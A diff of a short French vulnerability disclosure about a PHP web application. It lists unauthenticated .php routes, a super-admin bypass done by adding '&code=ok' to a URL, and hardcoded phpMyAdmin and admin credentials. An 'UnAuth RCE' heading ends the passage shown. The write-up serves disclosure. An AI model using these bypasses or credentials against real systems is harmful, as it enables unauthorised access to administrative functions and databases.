@@ -18,7 +18,7 @@ Content-Length: 19\
 Origin: xx\
 Connection: close\
 Cookie: PHPSESSID=ww\
-Upgrade-Insecure-Requests: 1\
+Upgrade-Insecure-Requests: 1
 
 login=test&pwd=test
 
@@ -26,19 +26,19 @@ login=test&pwd=test
 
 --- Vlà les manques de controle d'accès sur les fichiers .php dont route sont décritent dans les fichiers js--- 
 
-/choix/choix_version_svg.php?resolution=1920x1080
+/choix/choix_version_svg.php?resolution=1920x1080\
 /config/configubuntu.php?resolution=1920x1080
 ...
 
 --- Bypass auth super-admin (alors celle la..) ---
 
-/systeme/super_administrateur.php?resolution=1920x1080 (oh lala besoin d'un mdp..)
+/systeme/super_administrateur.php?resolution=1920x1080 (oh lala besoin d'un mdp..)\
 /systeme/super_administrateur.php?resolution=1920x1080&code=ok (ah non c'est bon)
 
 
 --- Hardcoded creds ---
 
-/phpmyadminatawa/index.php (MySQL_Atawa:Atawa&13)
+/phpmyadminatawa/index.php (MySQL_Atawa:Atawa&13)\
 /systeme/super_administrateur.php (33310 - hardcoded dans le js..)
 
 --- UnAuth RCE (ayayay vie d'ma mèrrrrrr)---
